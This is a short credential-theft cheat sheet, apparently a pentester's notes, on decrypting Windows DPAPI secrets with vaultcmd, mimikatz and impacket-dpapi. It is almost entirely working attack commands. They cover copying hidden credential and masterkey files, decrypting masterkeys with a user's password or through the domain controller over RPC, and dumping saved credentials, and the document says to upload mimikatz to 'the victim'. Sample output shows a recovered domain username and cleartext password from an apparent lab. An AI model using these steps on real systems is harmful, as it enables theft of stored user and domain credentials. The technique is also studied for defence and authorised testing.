### DPAPI Secrets decrypt
Here will you find a guide on how to manage DPAPI secrets and how to decrypt them to unveil usueful information.
DPAPI secrets are password stored from Windows Vault(aka Credential Manager)

1)List for secrets
From cmd
```
vaultcmd /listcreds:"Windows Credentials" /all
```
From mimikatz
```
mimikatz vault::list
```
2)You can also manually check for secrets under paths:
```
ls -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
ls -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
3)Unhide and copy secrets locally to your machine
```
attrib -s -h "full path of file with extension"
```
4)Find SIDs
```
get-wmiobject Win32_useraccount | select name, sid
```
5)Find the Masterkey associated with it's Secret
```
impacket-dpapi credential -file <SECRETSFILE>
```
6)Find the Masterkeys(used to encrypt secrets)
```
ls -Hidden C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID
```
7)Unhide attribute and copy locally to your machine
8)Decrypt the master key(the Decrypted key is the key to be used)
```
impacket-dpapi masterkey -file 'path/to/masterkey' -password 'PASSWORD_OF_THE_USER' -sid 'SID_OF_THE_USER'
```
```
Decrypted key with User Key (SHA1)
Decrypted key: 0xe0b92cbfbeab126231d979377ffd236b2ebd4b0704e2e9229d3ce82bebd144173b9f7160315d5af62289fae50a1fd465100aaf36748b68557e2b05edc25ac4fe
```
9)Use the decrypted key to unprotected the secrets
```
impacket-dpapi credential -file 'path/to/secretfile' -key 'decrypted_masterkey_from_ste8'
```


## DPAPI secrets decrypt from /savedcred
(aka Domaincreds saved in Windows Cred Manager)
This is a very specific scenario when you find domain credentials saved in the "Windows Credentials Manager"  but you don't have credentials to decrypt the masterkey.

1)Check that secrets exist
```
vaultcmd /listcreds:"Windows Credentials" /all
```
2)Upload mimikatz to the victim
3)Find the user SID
```
get-wmiobject Win32_useraccount | select name, sid
```
4)Find the masterkey used to encrypt (download a secret locally)
```
impacket-dpapi credential -file <SECRETSFILE>
```
5)Now that you had SID/SECRET/MASTERKEY(from step 4) you can use the DC to decrypt user's Masterkeys
```
dpapi::masterkey /in:"C:\Users\USERNAME\Appdata\Microsoft\Protect\SID\MASTERKEY" /rpc
[...]
[domainkey] with RPC
[DC] 'lab.local' will be the domain
[DC] 'dc.lab.local' will be the DC server
  key : 3ed054e284b5d47796f4779a2c0de63ca0ea9c63ce9e3f6868e2dd4f1113f6f3c55d9c1e21d2378c4499f98c0682991647dfd5f60b4f05034163ff59651e4ad4
  sha1: 81c99543dea591c11f20d69027ea2016d89d07
6)Check that masterkey is saved in cache
dpapi::cache
MASTERKEYS cache
================
GUID:{cc6eb538-28f1-4ab4-adf2-f5594e88f0b2};KeyHash:81c99543dea591c11f20d69027ea2016d89d07dd
```
7)Now decrypt the singular secrets via cached master-key
```
dpapi::cred /in:"C:\Users\USERNAME\Appdata\Microsoft\Credentials\SECRET"
[...]
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0

```